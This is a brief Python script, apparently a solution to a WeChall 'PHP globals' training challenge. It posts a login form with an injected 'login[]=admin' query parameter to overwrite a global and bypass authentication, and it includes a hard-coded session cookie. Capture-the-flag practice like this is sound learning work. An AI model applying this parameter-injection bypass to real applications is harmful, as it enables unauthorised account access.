import requests

cookies = {"WC": "11068160-37667-z1PuydshfLuLpXFI"}
url = "https://www.wechall.net/challenge/training/php/globals/globals.php?login[]=admin"
# where username='admin' 
data = {"username":"test","password":"tes","send":"Send"}
r = requests.post(url, cookies=cookies, data=data)
print r.text
